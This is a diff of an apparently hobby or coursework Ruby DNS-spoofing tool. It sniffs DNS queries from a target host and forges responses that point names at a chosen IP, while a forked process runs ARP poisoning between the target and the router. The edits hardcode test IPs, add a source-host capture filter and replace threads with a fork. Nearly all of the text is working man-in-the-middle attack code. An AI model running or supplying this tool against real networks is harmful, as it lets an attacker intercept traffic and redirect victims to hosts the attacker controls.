@@ -99,7 +99,9 @@ end
 def sendResponse(packet, domainName, spoof_ip)
 
   # Convert the IP address
-  myIP = spoof_ip.split(".");
+  tester = '192.168.0.8'
+  myIP = tester.split(".")
+ # myIP = spoof_ip.split(".");
   myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
 
   # Create the UDP packet
@@ -109,6 +111,7 @@ def sendResponse(packet, domainName, spoof_ip)
   response.ip_saddr = packet.ip_daddr
   response.ip_daddr = packet.ip_saddr
   response.eth_daddr = packet.eth_saddr
+  response.eth_saddr = packet.eth_daddr
 
   # Transaction ID
   response.payload = packet.payload[0,2]
@@ -122,8 +125,8 @@ def sendResponse(packet, domainName, spoof_ip)
   end
 
   # Set more default values...........
-  response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
-  response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"
+  response.payload += "\x00\x00\x01" + "\x00\x01\xc0\x0c\x00"
+  response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00\x04"
 
   # IP
   response.payload += myIP2
@@ -135,6 +138,8 @@ def sendResponse(packet, domainName, spoof_ip)
   response.to_w($iface)
 
 end
+
+
 
 def get_info(packet)
   # Get the length of the first domain level (in hex)
@@ -190,7 +195,7 @@ end
 # Opens up the nic for capture.
 def sniff(iface)
   puts 'Sniffing...'
-  cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and port 53', :save => true)
+  cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and port 53 and src host ' + $target_ip, :save => true)
   cap.stream.each do |p|
     packet = Packet.parse p
 
@@ -198,7 +203,8 @@ def sniff(iface)
 
     if $dnsQuery == '10'
       domain = get_info(packet)
-      spoof_ip = check_spoof(domain)
+      #spoof_ip = check_spoof(domain)
+      spoof_ip = '1.1.1.1'
       if !spoof_ip.nil?
         sendResponse(packet, domain, spoof_ip)
       end
@@ -210,17 +216,29 @@ def sniff(iface)
 end
 
 begin
-  puts "Starting the ARP poisoning thread..."
-  spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
+  #puts "Starting the ARP poisoning thread..."
+  #spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
 
-  puts "Starting the sniffing thread..."
-  sniff_thread = Thread.new{sniff($iface)}
-  spoof_thread.join
-  sniff_thread.join
+  @pid = fork do
+    puts "Starting ARP poisioning"
+
+    # Ensure that we shut down the child cleanly
+    Signal.trap("INT") { exit }
+
+    runspoof(arp_packet_target, arp_packet_router)
+
+  end
+
+  Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
+  puts "Starting the sniffing..."
+  #sniff_thread = Thread.new{sniff($iface)}
+  sniff($iface)
+  #spoof_thread.join
+  #sniff_thread.join
+
     # Catch the interrupt and kill the thread
 rescue Interrupt
-  puts "\nARP spoof stopped by interrupt signal."
-  Thread.kill(spoof_thread)
+  puts "\nDNS spoof stopped by interrupt signal."
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
   exit 0
 end
